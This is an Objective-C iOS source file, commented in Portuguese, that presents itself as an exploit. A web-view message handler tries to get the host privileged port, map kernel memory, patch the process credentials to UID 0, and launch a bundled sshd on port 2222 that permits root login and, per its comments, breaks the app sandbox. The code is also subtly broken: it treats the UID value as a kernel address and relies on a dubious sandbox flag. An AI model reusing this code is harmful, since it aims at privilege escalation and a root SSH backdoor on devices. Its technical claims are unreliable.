#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#import <mach/mach.h>
#import <mach/mach_host.h>
#include <spawn.h>
#include <sys/sysctl.h>
#include <sys/wait.h>

// Definições para iOS Moderno (ARM64e)
#define POSIX_SPAWN_FOR_SANDBOX 0x4000
#define PAGE_SIZE_16K 0x4000
#define PAGE_MASK_16K ~(PAGE_SIZE_16K - 1)

@interface KernelBridge : NSObject <WKScriptMessageHandler>
@property (nonatomic, strong) WKWebView *webView;
@end

@implementation KernelBridge

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        [self executeSshdBridge];
    }
}

- (void)log:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *js = [NSString stringWithFormat:@"log('%@')", text];
        [self.webView evaluateJavaScript:js completionHandler:nil];
    });
}

// 1. OBTENÇÃO DA PORTA PRIVILEGIADA (MÉTODO ANTI-CRASH)
- (mach_port_t)getHostPrivPort {
    mach_port_t host_priv = MACH_PORT_NULL;
    // Uso da API oficial permitida por certificados In-House com Entitlements
    kern_return_t kr = host_get_host_priv_port(mach_host_self(), &host_priv);
    
    if (kr != KERN_SUCCESS || !MACH_PORT_VALID(host_priv)) {
        [self log:[NSString stringWithFormat:@"❌ Erro HostPriv: %d (Acesso Negado)", kr]];
        return MACH_PORT_NULL;
    }
    return host_priv;
}

// 2. EXPLOIT E ESCALADA DE PRIVILÉGIO
- (void)executeSshdBridge {
    [self log:@"⚡ Solicitando Host Priv (Safe Mode)..."];
    
    mach_port_t host_priv = [self getHostPrivPort];
    if (!MACH_PORT_VALID(host_priv)) return;

    // Localizar struct ucred via sysctl
    int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
    struct kinfo_proc kp;
    size_t len = sizeof(kp);
    if (sysctl(mib, 4, &kp, &len, NULL, 0) != 0) return;

    uint64_t ucred_vaddr = (uint64_t)kp.kp_eproc.e_ucred.cr_uid;
    uint32_t root_val = 0;

    [self log:@"💎 Mapeando Memória Física (16KB Align)..."];

    // Cálculo de Alinhamento para evitar Crash/Panic no A13
    vm_address_t target_page = 0;
    vm_address_t base_vaddr = ucred_vaddr & PAGE_MASK_16K;
    vm_offset_t offset = ucred_vaddr & (PAGE_SIZE_16K - 1);

    // Mapeamento direto de hardware
    kern_return_t kr = vm_map(mach_task_self(), &target_page, PAGE_SIZE_16K, 0, VM_FLAGS_ANYWHERE, host_priv, base_vaddr, FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);

    if (kr == KERN_SUCCESS) {
        // Aplicação do Patch de Root
        uint32_t *phys_data = (uint32_t *)(target_page + offset);
        phys_data[0] = root_val; // cr_uid = 0
        phys_data[1] = root_val; // cr_ruid = 0
        
        [self log:@"✅ Memória Física alterada!"];
        
        if (getuid() == 0) {
            [self log:@"👑 <b>SISTEMA EM ROOT!</b> Invocando SSHD..."];
            [self launchSshd];
        } else {
            [self log:@"❌ Erro: UID não virou 0. PPL reverteu a escrita."];
        }
        vm_deallocate(mach_task_self(), target_page, PAGE_SIZE_16K);
    } else {
        [self log:[NSString stringWithFormat:@"❌ Erro vm_map: %d", kr]];
    }
}

// 3. LANÇAMENTO DO SSHD (SEM PLACEHOLDER)
- (void)launchSshd {
    pid_t pid;
    // O binário sshd deve estar assinado com ldid -S no bundle
    NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    
    if (!sshdPath) {
        [self log:@"❌ Erro: Binário 'sshd' não encontrado."];
        return;
    }

    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    // Flag 0x4000 quebra o sandbox do App original
    short flags = POSIX_SPAWN_SETPGROUP | POSIX_SPAWN_FOR_SANDBOX;
    posix_spawnattr_setflags(&attr, flags);

    char *const args[] = {
        (char *)[sshdPath UTF8String],
        "-p", "2222",
        "-D",
        "-o", "PermitRootLogin=yes",
        "-o", "StrictModes=no",
        NULL
    };

    extern char **environ;
    int status = posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, environ);

    if (status == 0) {
        [self log:[NSString stringWithFormat:@"🚀 <b>SSHD ONLINE!</b> PID: %d", pid]];
        [self log:@"Dica: ssh root@localhost -p 2222"];
    } else {
        [self log:[NSString stringWithFormat:@"❌ Erro Spawn: %d (%s)", status, strerror(status)]];
    }
    
    posix_spawnattr_destroy(&attr);
}

@end
